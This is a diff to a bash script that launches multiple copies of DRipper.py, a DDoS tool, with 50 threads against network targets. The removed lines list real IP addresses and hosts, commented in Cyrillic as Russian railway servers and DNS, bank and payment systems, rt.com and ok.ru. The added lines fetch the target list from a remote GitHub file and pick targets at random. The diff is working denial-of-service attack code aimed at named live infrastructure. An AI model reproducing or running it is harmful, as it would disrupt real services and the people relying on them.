@@ -41,37 +41,19 @@ do
    pkill -f DRipper.py
 done
 
+list_size=$(curl -s https://raw.githubusercontent.com/KarboDuck/karbo-wiki/master/DRipper_targets | cat | wc -l)
 
-
-
-
-declare -a targets
-###################### LIST OF TARGETS #########################
-targets[0]="193.104.87.251 80 tcp"       #РЖД
-targets[1]="194.84.25.50 80 tcp"         #РЖД
-targets[2]="5.188.56.124 22 tcp"         #админ сервер ВТБ
-targets[3]="194.54.14.131 4477 tcp"      #порт додатку сбера
-targets[4]="rt.com 80 tcp"               #rt.com
-targets[5]="rt.com 443 tcp"              #rt.com
-targets[6]="5.61.23.11 80 tcp"           #ok.ru
-targets[7]="195.208.109.58 80 tcp"       ##acs.vendorcert.mirconnect.ru
-targets[8]="195.208.109.58 443 tcp"      #acs.vendorcert.mirconnect.ru
-targets[9]="217.175.155.100 53 udp"      #DNS'ки РЖД.ру
-targets[10]="217.175.155.12 53 udp"      #DNS'ки РЖД.ру
-targets[11]="217.175.140.71 53 udp"      #DNS'ки РЖД.ру
-################################################################
-list_size=${#targets[*]}
-
-# Get multiple random numbers to choose multiple targets from "targets" array
+# Get multiple random numbers to choose multiple targets from DRipper_targets
 random_numbers=$(shuf -i 1-$list_size -n $num_of_targets)
 
 # Launch several copies of DRipper.
 for i in $(seq 1 $num_of_targets)
 do
              # Get address, port and protocol from pre-selected target
-             addr=$(echo ${targets[i]} | awk '{print $1}')
-             port=$(echo ${targets[i]} | awk '{print $2}')
-             prot=$(echo ${targets[i]} | awk '{print $3}')
+             site=$(curl -s https://raw.githubusercontent.com/KarboDuck/karbo-wiki/master/DRipper_targets | cat | shuf -n 1)
+             addr=$(echo $site | awk '{print $1}')
+             port=$(echo $site | awk '{print $2}')
+             prot=$(echo $site | awk '{print $3}')
             
              # Launch DRipper
              python3 -u ~/russia_ddos/DRipper.py -l 2048 -s $addr -p $port -m $prot -t 50&
